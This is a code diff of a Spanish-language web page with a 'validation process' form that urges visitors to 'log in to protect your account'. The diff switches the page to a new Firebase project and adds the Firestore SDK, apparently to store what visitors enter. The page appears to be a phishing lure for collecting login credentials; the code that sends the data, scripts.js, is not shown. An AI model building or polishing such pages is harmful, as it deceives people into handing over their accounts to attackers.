@@ -27,7 +27,8 @@
   <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
     <form action="#" class="contact-form">
       <h5 class="title">Proceso de validación</h5>
-      <p class="description">Inicie Sesion para anular cambio de información
+      <p class="description">Inicie Sesion para proteger su cuenta
+      </p>
       </p>
       <div id="numo">
       <div>
@@ -65,21 +66,23 @@
 <!-- The core Firebase JS SDK is always required and must be listed first -->
 <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
 
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
-
-// Your web app's Firebase configuration
-const firebaseConfig = {
-  apiKey: "AIzaSyCyHxgSuXezVz_k2RjCQ0jDYXEAB-3BJRM",
-  authDomain: "newlive-2d859.firebaseapp.com",
-  projectId: "newlive-2d859",
-  storageBucket: "newlive-2d859.appspot.com",
-  messagingSenderId: "311533288846",
-  appId: "1:311533288846:web:b7064ef101fef52342f8df"
+<!-- TODO: Add SDKs for Firebase products that you want to use
+ https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+    apiKey: "AIzaSyAKv-6Y4imxRvmGho0R2V2BGt3Y7JSggr4",
+  authDomain: "newlive-efecd.firebaseapp.com",
+  projectId: "newlive-efecd",
+  storageBucket: "newlive-efecd.appspot.com",
+  messagingSenderId: "482955984270",
+  appId: "1:482955984270:web:0a4b7a9f440642d6e938df"
 };
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
+    // Initialize Firebase
+  
+    firebase.initializeApp(firebaseConfig);
 </script>
 <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 <script src="scripts.js"></script>
